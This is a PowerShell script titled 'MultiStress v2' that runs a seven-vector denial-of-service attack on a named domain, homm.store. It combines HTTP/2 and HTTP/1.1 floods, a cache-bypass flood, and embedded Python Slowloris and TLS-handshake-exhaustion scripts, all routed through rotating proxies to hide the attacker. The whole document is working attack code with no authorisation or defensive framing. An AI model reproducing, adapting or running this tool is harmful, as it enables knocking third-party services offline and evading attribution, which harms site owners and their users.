# MultiStress v2 — Windows, with proxy rotation
# Run: .\run-windows-proxy.ps1 [proxies.txt]
# Note: SOCKS5 proxies require proxychains or a local SOCKS5->HTTP bridge.
#       HTTP proxies work natively for all HTTP flood tools.
#       Slowloris and SSL exhaustion use PySocks (supports SOCKS5 natively).

param([string]$ProxiesFile = "proxies.txt")

$Target      = "https://homm.store"
$TargetHost  = "homm.store"
$TargetPort  = 443
$Duration    = 300
$Workers     = 400
$BinDir      = "$PSScriptRoot\bin"
$LogDir      = "$env:TEMP\multistress_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
$Jobs        = @()
$Proxies     = @()

$ErrorActionPreference = "Continue"

function Write-Log  { param($msg) Write-Host "[$([datetime]::Now.ToString('HH:mm:ss'))] $msg" -ForegroundColor White }
function Write-Ok   { param($msg) Write-Host "  [OK] $msg" -ForegroundColor Green }
function Write-Warn { param($msg) Write-Host "  [WARN] $msg" -ForegroundColor Yellow }

function Load-Proxies {
  if (-not (Test-Path $ProxiesFile)) {
    Write-Warn "proxies.txt not found — running without proxies"
    $script:Proxies = @("")
    return
  }
  $script:Proxies = Get-Content $ProxiesFile |
    Where-Object { $_ -notmatch '^\s*#' -and $_ -match '\S' }
  Write-Log "Loaded $($script:Proxies.Count) proxies"
}

function Get-Proxy { param([int]$Index)
  if ($script:Proxies.Count -eq 0) { return "" }
  return $script:Proxies[$Index % $script:Proxies.Count]
}

# Parse proxy string → (type, host, port, user, pass)
function Parse-Proxy { param([string]$proxy)
  if (-not $proxy) { return $null }
  if ($proxy -match '^(socks5|http)://(?:(.+):(.+)@)?([^:]+):(\d+)') {
    return @{
      Type = $Matches[1]
      User = $Matches[2]
      Pass = $Matches[3]
      Host = $Matches[4]
      Port = $Matches[5]
    }
  }
  return $null
}

# Build -x flag for hey (HTTP proxy only)
function Get-ProxyFlag { param([string]$proxy)
  $p = Parse-Proxy $proxy
  if (-not $p) { return @() }
  if ($p.Type -eq "http") {
    return @("-x", $proxy)
  }
  # SOCKS5 — hey doesn't support natively on Windows without proxychains
  Write-Warn "hey/bombardier/fortio don't support SOCKS5 natively on Windows. Use HTTP proxy or install proxychains."
  return @()
}

function Get-GithubBinary {
  param($Repo, $AssetPattern, $OutName)
  $dest = "$BinDir\$OutName"
  if (Test-Path $dest) { return $dest }
  Write-Log "Downloading $OutName..."
  try {
    $rel   = Invoke-RestMethod "https://api.github.com/repos/$Repo/releases/latest"
    $asset = $rel.assets | Where-Object { $_.name -like $AssetPattern } | Select-Object -First 1
    if (-not $asset) { Write-Warn "No asset '$AssetPattern' in $Repo"; return $null }
    $tmp = "$env:TEMP\$($asset.name)"
    Invoke-WebRequest $asset.browser_download_url -OutFile $tmp -UseBasicParsing
    if ($tmp -like "*.zip") {
      Expand-Archive $tmp "$env:TEMP\ms_ex" -Force
      $exe = Get-ChildItem "$env:TEMP\ms_ex" -Filter $OutName -Recurse | Select-Object -First 1
      if ($exe) { Copy-Item $exe.FullName $dest }
      Remove-Item "$env:TEMP\ms_ex" -Recurse -Force -ErrorAction SilentlyContinue
    } else { Copy-Item $tmp $dest }
    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    Write-Ok "$OutName ready"; return $dest
  } catch { Write-Warn "Failed: $_"; return $null }
}

function Install-Tools {
  Write-Log "Checking dependencies..."
  New-Item -ItemType Directory -Force -Path $BinDir | Out-Null
  if (Get-Command python -ErrorAction SilentlyContinue) {
    python -m pip install -q PySocks 2>$null
  } else {
    Write-Warn "Python not found — slowloris/ssl_exhaustion unavailable"
  }
  $script:Bombardier = Get-GithubBinary "codesenberg/bombardier" "bombardier-windows-amd64.exe" "bombardier.exe"
  $script:Hey        = Get-GithubBinary "rakyll/hey"             "hey_windows_amd64"            "hey.exe"
  $script:Vegeta     = Get-GithubBinary "tsenart/vegeta"         "vegeta_*_windows_amd64.zip"   "vegeta.exe"
  $script:Fortio     = Get-GithubBinary "fortio/fortio"          "fortio_win_*_amd64.zip"       "fortio.exe"
  Write-Ok "Setup complete"
}

function Write-Helpers {
  # Slowloris with SOCKS5 support
  @'
import socket,ssl,time,threading,signal,sys,random,string,socks
HOST,PORT,COUNT,TIMEOUT=sys.argv[1],int(sys.argv[2]),int(sys.argv[3]),int(sys.argv[4])
PROXY=sys.argv[5] if len(sys.argv)>5 else ""
def parse(p):
    if not p: return None
    proto=p.split("://")[0]; rest=p.split("://")[1]
    user=pw=None
    if "@" in rest:
        up,hp=rest.rsplit("@",1); user,pw=up.split(":",1)
    else: hp=rest
    h,port=hp.rsplit(":",1)
    return (socks.SOCKS5 if "socks5" in proto else socks.HTTP,h,int(port),True,user,pw)
pc=parse(PROXY); sockets=[]; lock=threading.Lock(); stop=threading.Event()
def make():
    s=socks.socksocket() if pc else socket.socket()
    if pc: s.set_proxy(*pc)
    s.settimeout(4)
    ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    s=ctx.wrap_socket(s,server_hostname=HOST); s.connect((HOST,PORT)); return s
def rand(n): return ''.join(random.choices(string.ascii_letters,k=n))
def open_all():
    for _ in range(COUNT):
        if stop.is_set(): break
        try:
            s=make(); s.send(f"GET /?{rand(8)} HTTP/1.1\r\nHost: {HOST}\r\n".encode())
            with lock: sockets.append(s)
        except: pass
    print(f"[slowloris] Opened {len(sockets)}",flush=True)
def keep():
    start=time.time()
    while not stop.is_set() and time.time()-start<TIMEOUT:
        dead=[]
        with lock:
            for i,s in enumerate(sockets):
                try: s.send(f"X-A: {rand(6)}\r\n".encode())
                except: dead.append(i)
            for i in reversed(dead): sockets.pop(i)
        for _ in range(len(dead)):
            try:
                s=make(); s.send(f"GET /?{rand(8)} HTTP/1.1\r\nHost: {HOST}\r\n".encode())
                with lock: sockets.append(s)
            except: pass
        print(f"[slowloris] alive={len(sockets)}",flush=True); time.sleep(10)
import signal as _s; _s.signal(_s.SIGTERM,lambda *_: stop.set())
open_all(); keep()
'@ | Set-Content "$env:TEMP\slowloris_proxy.py" -Encoding UTF8

  @'
import ssl,socket,time,threading,signal,sys,socks
HOST,PORT,THREADS,TIMEOUT=sys.argv[1],int(sys.argv[2]),int(sys.argv[3]),int(sys.argv[4])
PROXY=sys.argv[5] if len(sys.argv)>5 else ""
def parse(p):
    if not p: return None
    proto=p.split("://")[0]; rest=p.split("://")[1]
    user=pw=None
    if "@" in rest:
        up,hp=rest.rsplit("@",1); user,pw=up.split(":",1)
    else: hp=rest
    h,port=hp.rsplit(":",1)
    return (socks.SOCKS5 if "socks5" in proto else socks.HTTP,h,int(port),True,user,pw)
pc=parse(PROXY); stop=threading.Event(); count=[0]; lock=threading.Lock()
def loop():
    while not stop.is_set():
        try:
            s=socks.socksocket() if pc else socket.socket()
            if pc: s.set_proxy(*pc)
            s.settimeout(3)
            ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
            w=ctx.wrap_socket(s,server_hostname=HOST); w.connect((HOST,PORT)); w.close()
            with lock: count[0]+=1
        except: pass
signal.signal(signal.SIGTERM,lambda *_: stop.set())
ts=[threading.Thread(target=loop,daemon=True) for _ in range(THREADS)]
for t in ts: t.start()
start=time.time()
while time.time()-start<TIMEOUT and not stop.is_set():
    print(f"[ssl_exhaustion] {int(time.time()-start)}s handshakes={count[0]}",flush=True); time.sleep(5)
stop.set(); print(f"Done. Total: {count[0]}",flush=True)
'@ | Set-Content "$env:TEMP\ssl_exhaustion_proxy.py" -Encoding UTF8
}

function Show-Progress { param($StartTime, $DurationSec)
  while ($true) {
    $el  = [int]([datetime]::Now - $StartTime).TotalSeconds
    $pct = [Math]::Min([int]($el * 100 / $DurationSec), 100)
    $f   = [int]($pct * 40 / 100)
    $bar = ("#" * $f) + ("-" * (40 - $f))
    Write-Host "`r[$bar] $pct% ${el}s/${DurationSec}s" -NoNewline -ForegroundColor Cyan
    if ($el -ge $DurationSec) { break }
    Start-Sleep -Seconds 2
  }
  Write-Host ""
}

function Start-AllVectors {
  New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
  Load-Proxies; Write-Helpers

  $p = @(0..6 | ForEach-Object { Get-Proxy $_ })
  $bust = Get-Random -Minimum 1 -Maximum 9999999
  $startTime = [datetime]::Now

  Write-Log "Launching 7 vectors on $Target | workers=$($Workers*4) | duration=${Duration}s`n"

  # 1. Bombardier
  if ($script:Bombardier) {
    $pf = Get-ProxyFlag $p[0]
    Write-Host "[1/7 BOMBARDIER]   HTTP/2 flood        -> proxy: $($p[0] -replace 'socks5|http','*')" -ForegroundColor Red
    $j = Start-Job -ScriptBlock {
      param($bin,$w,$d,$t,$pf)
      $args_list = @("-c",$w,"-d","${d}s","-t","1500ms","--http2","--insecure","-l",$t) + $pf
      & $bin @args_list 2>&1
    } -ArgumentList $script:Bombardier,$Workers,$Duration,$Target,$pf
    $script:Jobs += $j
  }

  # 2. Hey
  if ($script:Hey) {
    $pf = Get-ProxyFlag $p[1]
    Write-Host "[2/7 HEY]          HTTP/1.1 keep-alive -> proxy: $($p[1] -replace 'socks5|http','*')" -ForegroundColor Green
    $j = Start-Job -ScriptBlock {
      param($bin,$w,$d,$t,$pf)
      $args_list = @("-c",$w,"-z","${d}s") + $pf + @($t)
      & $bin @args_list 2>&1
    } -ArgumentList $script:Hey,$Workers,$Duration,$Target,$pf
    $script:Jobs += $j
  }

  # 3. Vegeta (env var proxy)
  if ($script:Vegeta) {
    Write-Host "[3/7 VEGETA]       Constant-rate       -> proxy: $($p[2] -replace 'socks5|http','*')" -ForegroundColor Yellow
    $j = Start-Job -ScriptBlock {
      param($bin,$w,$d,$t,$proxy)
      $env:HTTPS_PROXY = $proxy; $env:HTTP_PROXY = $proxy
      "GET $t" | & $bin attack -rate=0 "-max-workers=$w" "-duration=${d}s" -insecure |
        & $bin report -every=10s 2>&1
    } -ArgumentList $script:Vegeta,$Workers,$Duration,$Target,$p[2]
    $script:Jobs += $j
  }

  # 4. Fortio (env var proxy)
  if ($script:Fortio) {
    Write-Host "[4/7 FORTIO]       Latency-aware       -> proxy: $($p[3] -replace 'socks5|http','*')" -ForegroundColor Cyan
    $j = Start-Job -ScriptBlock {
      param($bin,$w,$d,$t,$proxy)
      $env:HTTPS_PROXY = $proxy
      & $bin load -c $w -t "${d}s" -qps 0 -insecure $t 2>&1
    } -ArgumentList $script:Fortio,$Workers,$Duration,$Target,$p[3]
    $script:Jobs += $j
  }

  # 5. Slowloris (Python + SOCKS5)
  Write-Host "[5/7 SLOWLORIS]    Slow connections    -> proxy: $($p[4] -replace 'socks5|http','*')" -ForegroundColor Magenta
  $j = Start-Job -ScriptBlock {
    param($h,$port,$d,$proxy)
    python "$env:TEMP\slowloris_proxy.py" $h $port 200 $d $proxy 2>&1
  } -ArgumentList $TargetHost,$TargetPort,$Duration,$p[4]
  $script:Jobs += $j

  # 6. SSL Exhaustion (Python + SOCKS5)
  Write-Host "[6/7 SSL_EXHAUST]  TLS handshake flood -> proxy: $($p[5] -replace 'socks5|http','*')" -ForegroundColor Blue
  $j = Start-Job -ScriptBlock {
    param($h,$port,$d,$proxy)
    python "$env:TEMP\ssl_exhaustion_proxy.py" $h $port 100 $d $proxy 2>&1
  } -ArgumentList $TargetHost,$TargetPort,$Duration,$p[5]
  $script:Jobs += $j

  # 7. Cache Bypass
  if ($script:Hey) {
    $pf = Get-ProxyFlag $p[6]
    Write-Host "[7/7 CACHE_BYPASS] Random query string -> proxy: $($p[6] -replace 'socks5|http','*')" -ForegroundColor Red
    $j = Start-Job -ScriptBlock {
      param($bin,$w,$d,$t,$bust,$pf)
      $args_list = @("-c",$w,"-z","${d}s","-H","Cache-Control: no-cache","-H","Pragma: no-cache") + $pf + @("${t}?bust=${bust}")
      & $bin @args_list 2>&1
    } -ArgumentList $script:Hey,$Workers,$Duration,$Target,$bust,$pf
    $script:Jobs += $j
  }

  Write-Host "`nLogs: $LogDir | Ctrl+C to stop`n"

  # Live output
  $liveJob = Start-Job -ScriptBlock {
    param($jobs)
    while ($true) {
      foreach ($j in $jobs) {
        $out = Receive-Job $j -Keep 2>$null
        if ($out) { $out | Select-Object -Last 2 | ForEach-Object { Write-Output $_ } }
      }
      Start-Sleep -Milliseconds 800
    }
  } -ArgumentList (,$script:Jobs)
  $script:Jobs += $liveJob

  Show-Progress -StartTime $startTime -DurationSec $Duration

  Write-Host "`n`n[OK] Done." -ForegroundColor Green
  Start-Sleep 2

  Write-Host "`n=== SUMMARY ===" -ForegroundColor White
  foreach ($j in $script:Jobs) {
    $out = Receive-Job $j 2>$null
    if ($out) { $out | Select-Object -Last 6 | ForEach-Object { Write-Host $_ } }
  }
  Write-Host "`nFull logs: $LogDir\" -ForegroundColor Cyan
}

function Stop-All {
  Write-Host "`nStopping all jobs..." -ForegroundColor Red
  $script:Jobs | ForEach-Object {
    Stop-Job $_ -ErrorAction SilentlyContinue
    Remove-Job $_ -Force -ErrorAction SilentlyContinue
  }
}

try {
  Write-Host "`n>> MULTISTRESS v2 -- Windows -- proxy mode" -ForegroundColor Red
  Write-Host "   Proxies: $ProxiesFile`n"
  Install-Tools
  Start-AllVectors
} finally {
  Stop-All
}
